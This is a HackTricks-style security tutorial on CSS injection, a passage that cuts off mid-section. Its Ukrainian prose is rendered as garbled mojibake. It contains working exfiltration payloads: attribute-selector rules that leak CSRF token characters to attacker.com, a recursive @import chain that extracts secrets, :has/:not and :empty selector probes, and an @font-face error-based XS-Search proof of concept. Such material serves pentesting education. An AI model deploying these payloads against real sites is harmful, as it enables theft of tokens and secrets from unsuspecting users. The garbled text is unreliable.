# CSS Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## CSS Injection

### Attribute Selector

CSS —Å–µ–ª–µ–∫—Ç–æ—Ä–∏ —Å—Ç–≤–æ—Ä–µ–Ω—ñ –¥–ª—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—Å—Ç—ñ –∑–Ω–∞—á–µ–Ω–Ω—è–º –∞—Ç—Ä–∏–±—É—Ç—ñ–≤ `name` —Ç–∞ `value` –µ–ª–µ–º–µ–Ω—Ç–∞ `input`. –Ø–∫—â–æ –∞—Ç—Ä–∏–±—É—Ç –∑–Ω–∞—á–µ–Ω–Ω—è –µ–ª–µ–º–µ–Ω—Ç–∞ –≤–≤–µ–¥–µ–Ω–Ω—è –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ –ø–µ–≤–Ω–æ–≥–æ —Å–∏–º–≤–æ–ª—É, –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∑–Ω–∞—á–µ–Ω–∏–π –∑–æ–≤–Ω—ñ—à–Ω—ñ–π —Ä–µ—Å—É—Ä—Å:
```css
input[name=csrf][value^=a]{
background-image: url(https://attacker.com/exfil/a);
}
input[name=csrf][value^=b]{
background-image: url(https://attacker.com/exfil/b);
}
/* ... */
input[name=csrf][value^=9]{
background-image: url(https://attacker.com/exfil/9);
}
```
–û–¥–Ω–∞–∫ —Ü–µ–π –ø—ñ–¥—Ö—ñ–¥ —Å—Ç–∏–∫–∞—î—Ç—å—Å—è –∑ –æ–±–º–µ–∂–µ–Ω–Ω—è–º –ø—Ä–∏ —Ä–æ–±–æ—Ç—ñ –∑ –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏–º–∏ –µ–ª–µ–º–µ–Ω—Ç–∞–º–∏ –≤–≤–µ–¥–µ–Ω–Ω—è (`type="hidden"`), –æ—Å–∫—ñ–ª—å–∫–∏ –ø—Ä–∏—Ö–æ–≤–∞–Ω—ñ –µ–ª–µ–º–µ–Ω—Ç–∏ –Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å —Ñ–æ–Ω–∏.

#### –û–±—Ö—ñ–¥ –¥–ª—è –ø—Ä–∏—Ö–æ–≤–∞–Ω–∏—Ö –µ–ª–µ–º–µ–Ω—Ç—ñ–≤

–©–æ–± –æ–±—ñ–π—Ç–∏ —Ü–µ –æ–±–º–µ–∂–µ–Ω–Ω—è, –≤–∏ –º–æ–∂–µ—Ç–µ –Ω–∞—Ü—ñ–ª–∏—Ç–∏—Å—è –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –µ–ª–µ–º–µ–Ω—Ç-—Åibling, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫–æ–º–±—ñ–Ω–∞—Ü—ñ—é –∑–∞–≥–∞–ª—å–Ω–æ–≥–æ sibling `~`. –ü—Ä–∞–≤–∏–ª–æ CSS —Ç–æ–¥—ñ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –¥–æ –≤—Å—ñ—Ö sibling, —â–æ –π–¥—É—Ç—å –ø—ñ—Å–ª—è –ø—Ä–∏—Ö–æ–≤–∞–Ω–æ–≥–æ –µ–ª–µ–º–µ–Ω—Ç–∞ –≤–≤–µ–¥–µ–Ω–Ω—è, –∑–º—É—à—É—é—á–∏ —Ñ–æ–Ω–æ–≤–µ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏—Å—è:
```css
input[name=csrf][value^=csrF] ~ * {
background-image: url(https://attacker.com/exfil/csrF);
}
```
–ü—Ä–∞–∫—Ç–∏—á–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –¥–µ—Ç–∞–ª—å–Ω–æ –æ–ø–∏—Å–∞–Ω–∏–π —É –Ω–∞–¥–∞–Ω–æ–º—É —Ñ—Ä–∞–≥–º–µ–Ω—Ç—ñ –∫–æ–¥—É. –í–∏ –º–æ–∂–µ—Ç–µ –ø–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ –π–æ–≥–æ [—Ç—É—Ç](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).

#### –ü–µ—Ä–µ–¥—É–º–æ–≤–∏ –¥–ª—è CSS Injection

–î–ª—è —Ç–æ–≥–æ —â–æ–± —Ç–µ—Ö–Ω—ñ–∫–∞ CSS Injection –±—É–ª–∞ –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ—é, –ø–æ–≤–∏–Ω–Ω—ñ –±—É—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω—ñ –ø–µ–≤–Ω—ñ —É–º–æ–≤–∏:

1. **–î–æ–≤–∂–∏–Ω–∞ Payload**: –í–µ–∫—Ç–æ—Ä CSS injection –ø–æ–≤–∏–Ω–µ–Ω –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–æ—Å—Ç–∞—Ç–Ω—å–æ –¥–æ–≤–≥—ñ payload –¥–ª—è —Ä–æ–∑–º—ñ—â–µ–Ω–Ω—è —Å—Ç–≤–æ—Ä–µ–Ω–∏—Ö —Å–µ–ª–µ–∫—Ç–æ—Ä—ñ–≤.
2. **–ü–æ–≤—Ç–æ—Ä–Ω–∞ –æ—Ü—ñ–Ω–∫–∞ CSS**: –í–∏ –ø–æ–≤–∏–Ω–Ω—ñ –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –æ—Ñ–æ—Ä–º–∏—Ç–∏ —Å—Ç–æ—Ä—ñ–Ω–∫—É, —â–æ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –¥–ª—è –≤–∏–∫–ª–∏–∫—É –ø–æ–≤—Ç–æ—Ä–Ω–æ—ó –æ—Ü—ñ–Ω–∫–∏ CSS –∑ –Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–∏–º–∏ payload.
3. **–ó–æ–≤–Ω—ñ—à–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏**: –¢–µ—Ö–Ω—ñ–∫–∞ –ø–µ—Ä–µ–¥–±–∞—á–∞—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∑–æ–≤–Ω—ñ—à–Ω—å–æ —Ä–æ–∑–º—ñ—â–µ–Ω–∏—Ö –∑–æ–±—Ä–∞–∂–µ–Ω—å. –¶–µ –º–æ–∂–µ –±—É—Ç–∏ –æ–±–º–µ–∂–µ–Ω–æ –ø–æ–ª—ñ—Ç–∏–∫–æ—é –±–µ–∑–ø–µ–∫–∏ –∫–æ–Ω—Ç–µ–Ω—Ç—É (CSP) —Å–∞–π—Ç—É.

### –°–ª—ñ–ø–∏–π —Å–µ–ª–µ–∫—Ç–æ—Ä –∞—Ç—Ä–∏–±—É—Ç—ñ–≤

–Ø–∫ [**–ø–æ—è—Å–Ω–µ–Ω–æ –≤ —Ü—å–æ–º—É –ø–æ—Å—Ç—ñ**](https://portswigger.net/research/blind-css-exfiltration), –º–æ–∂–ª–∏–≤–æ –ø–æ—î–¥–Ω–∞—Ç–∏ —Å–µ–ª–µ–∫—Ç–æ—Ä–∏ **`:has`** —ñ **`:not`** –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –∫–æ–Ω—Ç–µ–Ω—Ç—É –Ω–∞–≤—ñ—Ç—å –∑ —Å–ª—ñ–ø–∏—Ö –µ–ª–µ–º–µ–Ω—Ç—ñ–≤. –¶–µ –¥—É–∂–µ –∫–æ—Ä–∏—Å–Ω–æ, –∫–æ–ª–∏ –≤–∏ –Ω–µ –∑–Ω–∞—î—Ç–µ, —â–æ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏, —â–æ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î CSS injection.\
–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—ñ —Å–µ–ª–µ–∫—Ç–æ—Ä–∏ –¥–ª—è –≤–∏—Ç—è–≥—É–≤–∞–Ω–Ω—è —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑ –∫—ñ–ª—å–∫–æ—Ö –±–ª–æ–∫—ñ–≤ –æ–¥–Ω–æ–≥–æ —Ç–∏–ø—É, —è–∫ —É:
```html
<style>
html:has(input[name^="m"]):not(input[name="mytoken"]) {
background:url(/m);
}
</style>
<input name=mytoken value=1337>
<input name=myname value=gareth>
```
–û–±'—î–¥–Ω—É—é—á–∏ —Ü–µ –∑ –Ω–∞—Å—Ç—É–ø–Ω–æ—é —Ç–µ—Ö–Ω—ñ–∫–æ—é **@import**, –º–æ–∂–ª–∏–≤–æ –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏ –±–∞–≥–∞—Ç–æ **—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é CSS-—ñ–Ω'—î–∫—Ü—ñ—ó –∑ —Å–ª—ñ–ø–∏—Ö —Å—Ç–æ—Ä—ñ–Ω–æ–∫ –∑** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**

### @import

–ü–æ–ø–µ—Ä–µ–¥–Ω—è —Ç–µ—Ö–Ω—ñ–∫–∞ –º–∞—î –¥–µ—è–∫—ñ –Ω–µ–¥–æ–ª—ñ–∫–∏, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ –≤–∏–º–æ–≥–∏. –í–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –∞–±–æ **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∫—ñ–ª—å–∫–∞ –ø–æ—Å–∏–ª–∞–Ω—å –∂–µ—Ä—Ç–≤—ñ**, –∞–±–æ –≤–∏ –ø–æ–≤–∏–Ω–Ω—ñ –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–≤—Å—Ç–∞–≤–∏—Ç–∏ –≤ iframe —Å—Ç–æ—Ä—ñ–Ω–∫—É, –≤—Ä–∞–∑–ª–∏–≤—É –¥–æ CSS-—ñ–Ω'—î–∫—Ü—ñ—ó**.

–û–¥–Ω–∞–∫ —î —â–µ –æ–¥–Ω–∞ —Ö–∏—Ç—Ä–∞ —Ç–µ—Ö–Ω—ñ–∫–∞, —è–∫–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î **CSS `@import`** –¥–ª—è –ø–æ–∫—Ä–∞—â–µ–Ω–Ω—è —è–∫–æ—Å—Ç—ñ —Ç–µ—Ö–Ω—ñ–∫–∏.

–¶–µ –≤–ø–µ—Ä—à–µ –ø–æ–∫–∞–∑–∞–≤ [**Pepe Vila**](https://vwzq.net/slides/2019-s3\_css\_injection\_attacks.pdf) —ñ —Ü–µ –ø—Ä–∞—Ü—é—î —Ç–∞–∫:

–ó–∞–º—ñ—Å—Ç—å —Ç–æ–≥–æ, —â–æ–± –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –æ–¥–Ω—É –π —Ç—É –∂ —Å—Ç–æ—Ä—ñ–Ω–∫—É –∑–Ω–æ–≤—É —ñ –∑–Ω–æ–≤—É –∑ –¥–µ—Å—è—Ç–∫–∞–º–∏ —Ä—ñ–∑–Ω–∏—Ö –∫–æ—Ä–∏—Å–Ω–∏—Ö –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—å —â–æ—Ä–∞–∑—É (—è–∫ —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –≤–∏–ø–∞–¥–∫—É), –º–∏ –±—É–¥–µ–º–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Å—Ç–æ—Ä—ñ–Ω–∫—É –ª–∏—à–µ –æ–¥–∏–Ω —Ä–∞–∑ —ñ –ª–∏—à–µ –∑ —ñ–º–ø–æ—Ä—Ç–æ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞** (—Ü–µ –∫–æ—Ä–∏—Å–Ω–µ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —è–∫–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –∂–µ—Ä—Ç–≤—ñ):
```css
@import url('//attacker.com:5001/start?');
```
1. –Ü–º–ø–æ—Ä—Ç –±—É–¥–µ **–æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –¥–µ—è–∫–∏–π CSS —Å–∫—Ä–∏–ø—Ç** –≤—ñ–¥ –∞—Ç–∞–∫—É—é—á–∏—Ö, —ñ **–±—Ä–∞—É–∑–µ—Ä –π–æ–≥–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å**.
2. –ü–µ—Ä—à–∞ —á–∞—Å—Ç–∏–Ω–∞ CSS —Å–∫—Ä–∏–ø—Ç—É, —è–∫—É –Ω–∞–¥—ñ—à–ª–µ –∞—Ç–∞–∫—É—é—á–∏–π, –±—É–¥–µ **—ñ–Ω—à–∏–º `@import` –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∞—Ç–∞–∫—É—é—á–∏—Ö –∑–Ω–æ–≤—É.**
1. –°–µ—Ä–≤–µ—Ä –∞—Ç–∞–∫—É—é—á–∏—Ö –ø–æ–∫–∏ –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ—Å—Ç—å –Ω–∞ —Ü–µ–π –∑–∞–ø–∏—Ç, –æ—Å–∫—ñ–ª—å–∫–∏ –º–∏ —Ö–æ—á–µ–º–æ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –¥–µ—è–∫—ñ —Å–∏–º–≤–æ–ª–∏, –∞ –ø–æ—Ç—ñ–º –≤—ñ–¥–ø–æ–≤—ñ—Å—Ç–∏ –Ω–∞ —Ü–µ–π —ñ–º–ø–æ—Ä—Ç –∑ –∫–æ—Ä–∏—Å–Ω–∏–º –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º, —â–æ–± –≤–∏—Ç—ñ–∫–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ.
3. –î—Ä—É–≥–∞ —ñ –±—ñ–ª—å—à–∞ —á–∞—Å—Ç–∏–Ω–∞ –∫–æ—Ä–∏—Å–Ω–æ–≥–æ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –±—É–¥–µ **–∫–æ—Ä–∏—Å–Ω–∏–º –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è–º –¥–ª—è –≤–∏—Ç–æ–∫—É —Å–µ–ª–µ–∫—Ç–æ—Ä–∞ –∞—Ç—Ä–∏–±—É—Ç—ñ–≤**
1. –¶–µ –Ω–∞–¥—ñ—à–ª–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∞—Ç–∞–∫—É—é—á–∏—Ö **–ø–µ—Ä—à–∏–π —Å–∏–º–≤–æ–ª —Å–µ–∫—Ä–µ—Ç—É —ñ –æ—Å—Ç–∞–Ω–Ω—ñ–π.**
4. –Ø–∫ —Ç—ñ–ª—å–∫–∏ —Å–µ—Ä–≤–µ—Ä –∞—Ç–∞–∫—É—é—á–∏—Ö –æ—Ç—Ä–∏–º–∞—î **–ø–µ—Ä—à–∏–π —ñ –æ—Å—Ç–∞–Ω–Ω—ñ–π —Å–∏–º–≤–æ–ª —Å–µ–∫—Ä–µ—Ç—É**, –≤—ñ–Ω **–≤—ñ–¥–ø–æ–≤—ñ—Å—Ç—å –Ω–∞ —ñ–º–ø–æ—Ä—Ç, –∑–∞–ø–∏—Ç–∞–Ω–∏–π –Ω–∞ –∫—Ä–æ—Ü—ñ 2**.
1. –í—ñ–¥–ø–æ–≤—ñ–¥—å –±—É–¥–µ —Ç–æ—á–Ω–æ —Ç–∞–∫–æ—é –∂, —è–∫ **–∫—Ä–æ–∫–∏ 2, 3 —ñ 4**, –∞–ª–µ —Ü—å–æ–≥–æ —Ä–∞–∑—É –≤—ñ–Ω —Å–ø—Ä–æ–±—É—î **–∑–Ω–∞–π—Ç–∏ –¥—Ä—É–≥–∏–π —Å–∏–º–≤–æ–ª —Å–µ–∫—Ä–µ—Ç—É, –∞ –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–¥–æ—Å—Ç–∞–Ω–Ω—ñ–π**.

–ê—Ç–∞–∫—É—é—á–∏–π **–ø—Ä–æ–¥–æ–≤–∂–∏—Ç—å —Ü–µ–π —Ü–∏–∫–ª, –ø–æ–∫–∏ –Ω–µ –∑–º–æ–∂–µ –ø–æ–≤–Ω—ñ—Å—Ç—é –≤–∏—Ç—ñ–∫–∞—Ç–∏ —Å–µ–∫—Ä–µ—Ç**.

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏–π [**–∫–æ–¥ –ü–µ–ø–µ –í—ñ–ª–∏ –¥–ª—è –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó —Ü—å–æ–≥–æ —Ç—É—Ç**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) –∞–±–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –º–∞–π–∂–µ [**—Ç–æ–π –∂–µ –∫–æ–¥, –∞–ª–µ –∑ –∫–æ–º–µ–Ω—Ç–∞—Ä—è–º–∏ —Ç—É—Ç**.](./#css-injection)

{% hint style="info" %}
–°–∫—Ä–∏–ø—Ç —Å–ø—Ä–æ–±—É—î –≤–∏—è–≤–∏—Ç–∏ 2 —Å–∏–º–≤–æ–ª–∏ —â–æ—Ä–∞–∑—É (–∑ –ø–æ—á–∞—Ç–∫—É —ñ –∑ –∫—ñ–Ω—Ü—è), –æ—Å–∫—ñ–ª—å–∫–∏ —Å–µ–ª–µ–∫—Ç–æ—Ä –∞—Ç—Ä–∏–±—É—Ç—ñ–≤ –¥–æ–∑–≤–æ–ª—è—î —Ä–æ–±–∏—Ç–∏ —Ç–∞–∫—ñ —Ä–µ—á—ñ:
```css
/* value^=  to match the beggining of the value*/
input[value^="0"]{--s0:url(http://localhost:5001/leak?pre=0)}

/* value$=  to match the ending of the value*/
input[value$="f"]{--e0:url(http://localhost:5001/leak?post=f)}
```
–¶–µ –¥–æ–∑–≤–æ–ª—è—î —Å–∫—Ä–∏–ø—Ç—É —à–≤–∏–¥—à–µ –≤–∏—Ç—ñ–∫–∞—Ç–∏ —Å–µ–∫—Ä–µ—Ç.
{% endhint %}

{% hint style="warning" %}
–Ü–Ω–æ–¥—ñ —Å–∫—Ä–∏–ø—Ç **–Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –≤–∏–∑–Ω–∞—á–∞—î, —â–æ –ø—Ä–µ—Ñ—ñ–∫—Å + —Å—É—Ñ—ñ–∫—Å, —â–æ –±—É–ª–æ –≤–∏—è–≤–ª–µ–Ω–æ, –≤–∂–µ —î –ø–æ–≤–Ω–∏–º —Ñ–ª–∞–≥–æ–º** —ñ –ø—Ä–æ–¥–æ–≤–∂–∏—Ç—å —Ä—É—Ö–∞—Ç–∏—Å—è –≤–ø–µ—Ä–µ–¥ (–≤ –ø—Ä–µ—Ñ—ñ–∫—Å—ñ) —ñ –Ω–∞–∑–∞–¥ (–≤ —Å—É—Ñ—ñ–∫—Å—ñ), —ñ –≤ —è–∫–∏–π—Å—å –º–æ–º–µ–Ω—Ç –≤—ñ–Ω –∑–∞–≤–∏—Å–Ω–µ.\
–ù–µ —Ö–≤–∏–ª—é–π—Ç–µ—Å—è, –ø—Ä–æ—Å—Ç–æ –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ **–≤–∏—Ö—ñ–¥–Ω—ñ –¥–∞–Ω—ñ**, —Ç–æ–º—É —â–æ **–≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Ñ–ª–∞–≥ —Ç–∞–º**.
{% endhint %}

### –Ü–Ω—à—ñ —Å–µ–ª–µ–∫—Ç–æ—Ä–∏

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –¥–æ—Å—Ç—É–ø—É –¥–æ —á–∞—Å—Ç–∏–Ω DOM –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **CSS —Å–µ–ª–µ–∫—Ç–æ—Ä—ñ–≤**:

* **`.class-to-search:nth-child(2)`**: –¶–µ –±—É–¥–µ —à—É–∫–∞—Ç–∏ –¥—Ä—É–≥–∏–π –µ–ª–µ–º–µ–Ω—Ç –∑ –∫–ª–∞—Å–æ–º "class-to-search" –≤ DOM.
*   **`:empty`** —Å–µ–ª–µ–∫—Ç–æ—Ä: –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –≤ [**—Ü—å–æ–º—É –æ–ø–∏—Å—ñ**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**

```css
[role^="img"][aria-label="1"]:empty { background-image: url("YOUR_SERVER_URL?1"); }
```

### –ü–æ–º–∏–ª–∫–æ–≤–∏–π XS-Search

**–ü–æ—Å–∏–ª–∞–Ω–Ω—è:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)

–ó–∞–≥–∞–ª—å–Ω–∞ –º–µ—Ç–∞ –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤–ª–∞—Å–Ω–∏–π —à—Ä–∏—Ñ—Ç –∑ –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–æ—ó —Ç–æ—á–∫–∏ –¥–æ—Å—Ç—É–ø—É** —ñ –∑–∞–±–µ–∑–ø–µ—á–∏—Ç–∏, —â–æ–± **—Ç–µ–∫—Å—Ç (–≤ –¥–∞–Ω–æ–º—É –≤–∏–ø–∞–¥–∫—É, 'A') –≤—ñ–¥–æ–±—Ä–∞–∂–∞–≤—Å—è —Ü–∏–º —à—Ä–∏—Ñ—Ç–æ–º –ª–∏—à–µ –≤ —Ç–æ–º—É –≤–∏–ø–∞–¥–∫—É, —è–∫—â–æ –≤–∫–∞–∑–∞–Ω–∏–π —Ä–µ—Å—É—Ä—Å (`favicon.ico`) –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π**.
```html
<!DOCTYPE html>
<html>
<head>
<style>
@font-face{
font-family: poc;
src: url(http://attacker.com/?leak);
unicode-range:U+0041;
}

#poc0{
font-family: 'poc';
}

</style>
</head>
<body>

<object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
</body>
</html>
```
1. **–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –ö–∞—Å—Ç–æ–º–Ω–æ–≥–æ –®—Ä–∏—Ñ—Ç—É**:
- –ö–∞—Å—Ç–æ–º–Ω–∏–π —à—Ä–∏—Ñ—Ç –≤–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –ø—Ä–∞–≤–∏–ª–∞ `@font-face` –≤ `<style>` —Ç–µ–≥—É –≤ —Å–µ–∫—Ü—ñ—ó `<head>`.
- –®—Ä–∏—Ñ—Ç –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è `poc` —ñ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –∑ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ –µ–Ω–¥–ø–æ—ñ–Ω—Ç—É (`http://attacker.com/?leak`).
- –í–ª–∞—Å—Ç–∏–≤—ñ—Å—Ç—å `unicode-range` –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ `U+0041`, –Ω–∞—Ü—ñ–ª—é—é—á–∏—Å—å –Ω–∞ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–π —Å–∏–º–≤–æ–ª –Æ–Ω—ñ–∫–æ–¥—É 'A'.

2. **–ï–ª–µ–º–µ–Ω—Ç Object –∑ –†–µ–∑–µ—Ä–≤–Ω–∏–º –¢–µ–∫—Å—Ç–æ–º**:
- –°—Ç–≤–æ—Ä–µ–Ω–æ `<object>` –µ–ª–µ–º–µ–Ω—Ç –∑ `id="poc0"` –≤ —Å–µ–∫—Ü—ñ—ó `<body>`. –¶–µ–π –µ–ª–µ–º–µ–Ω—Ç –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ä–µ—Å—É—Ä—Å –∑ `http://192.168.0.1/favicon.ico`.
- `font-family` –¥–ª—è —Ü—å–æ–≥–æ –µ–ª–µ–º–µ–Ω—Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `'poc'`, —è–∫ –≤–∏–∑–Ω–∞—á–µ–Ω–æ –≤ —Å–µ–∫—Ü—ñ—ó `<style>`.
- –Ø–∫—â–æ —Ä–µ—Å—É—Ä—Å (`favicon.ico`) –Ω–µ –≤–¥–∞—î—Ç—å—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏, —Ä–µ–∑–µ—Ä–≤–Ω–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç (–ª—ñ—Ç–µ—Ä–∞ 'A') –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ç–µ–≥—É `<object>` –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î—Ç—å—Å—è.
- –†–µ–∑–µ—Ä–≤–Ω–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç ('A') –±—É–¥–µ –≤—ñ–¥–æ–±—Ä–∞–∂–µ–Ω–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∫–∞—Å—Ç–æ–º–Ω–æ–≥–æ —à—Ä–∏—Ñ—Ç—É `poc`, —è–∫—â–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ–π —Ä–µ—Å—É—Ä—Å –Ω–µ –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ.

### –°—Ç–∏–ª—ñ–∑–∞—Ü—ñ—è –§—Ä–∞–≥–º–µ–Ω—Ç–∞ –¢–µ–∫—Å—Ç—É –¥–ª—è –ü—Ä–æ–∫—Ä—É—Ç–∫–∏

–ü—Å–µ–≤–¥–æ–∫–ª–∞—Å **`:target`** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –≤–∏–±–æ—Ä—É –µ–ª–µ–º–µ–Ω—Ç–∞, –Ω–∞ —è–∫–∏–π –Ω–∞—Ü—ñ–ª–µ–Ω–∏–π **—Ñ—Ä–∞–≥–º–µ–Ω—Ç URL**, —è–∫ –∑–∞–∑–Ω–∞—á–µ–Ω–æ –≤ [—Å–ø–µ—Ü–∏—Ñ—ñ–∫–∞—Ü—ñ—ó CSS Selectors Level 4](https://drafts.csswg.org/selectors-4/#the-target-pseudo). –í–∞–∂–ª–∏–≤–æ —Ä–æ–∑—É–º—ñ—Ç–∏, —â–æ `::target-text` –Ω–µ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –∂–æ–¥–Ω–∏–º –µ–ª–µ–º–µ–Ω—Ç–∞–º, —è–∫—â–æ —Ç–µ–∫—Å—Ç –Ω–µ –Ω–∞—Ü—ñ–ª–µ–Ω–∏–π —è–≤–Ω–æ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–æ–º.

